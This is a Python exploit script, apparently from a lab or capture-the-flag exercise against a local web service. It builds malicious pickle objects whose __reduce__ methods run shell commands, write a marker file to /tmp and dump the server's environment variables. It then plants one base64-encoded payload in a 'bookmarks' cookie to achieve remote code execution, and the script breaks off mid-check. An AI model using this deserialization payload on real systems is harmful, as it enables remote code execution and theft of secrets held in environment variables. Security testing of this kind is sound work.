import base64
import pickle
import requests
import re
import subprocess
import json
import urllib.parse

# Target URL
target_url = "http://127.0.0.1:32827/list"

# Keep the existing user cookie from authentication
user_cookie = "5fb5fa20dbac4c5cacd23ae94e1b2709"

# Try different approach - maybe the issue is with how output is captured
# Let's try a payload that directly modifies the response or uses a different method

print("[*] Testing pickle deserialization with different payload approach...")

# Approach 1: Use subprocess to capture output better
class RCE_Subprocess:
    def __reduce__(self):
        import subprocess
        import os
        # Use check_output to capture stdout
        cmd = 'python -c "import os, json; env = dict(os.environ); print(\'===ENV_VARS_START===\'); print(json.dumps(env)); print(\'===ENV_VARS_END===\')"'
        return (subprocess.check_output, (cmd,), {'shell': True, 'text': True})

# Approach 2: Direct file write to see if we can create a file (testing if RCE works)
class RCE_FileWrite:
    def __reduce__(self):
        import os
        # Create a test file to confirm RCE
        return (os.system, ('echo "PICKLE_RCE_CONFIRMED" > /tmp/pickle_test',))

# Approach 3: Use eval to execute code that returns a string
class RCE_Eval:
    def __reduce__(self):
        return (eval, ('"===ENV_VARS_START===" + "\\n".join([f"{k}={v}" for k,v in __import__("os").environ.items()]) + "\\n===ENV_VARS_END==="',))

# Let's use Approach 3 as it's more likely to return data
print("[*] Generating eval-based pickle payload...")
rce_payload = RCE_Eval()
malicious_pickle_payload = base64.b64encode(pickle.dumps(rce_payload, protocol=4)).decode('utf-8')

print(f"[+] Generated payload (first 100 chars): {malicious_pickle_payload[:100]}...")
print(f"[+] Payload length: {len(malicious_pickle_payload)}")

# Set up cookies
cookies = {
    "user": user_cookie,
    "bookmarks": malicious_pickle_payload
}

print(f"[*] Making GET request to {target_url}")

try:
    # Make the request
    response = requests.get(target_url, cookies=cookies, timeout=30)
    
    print(f"[+] Response Status: {response.status_code}")
    print(f"[+] Response Body:")
    print(response.text)
    print("-" * 80)
    
    # Check for our markers
    env_start = "===ENV_VARS_START==="
    env_end = "===ENV_VARS_END==="
    
    if env_start in response.text:
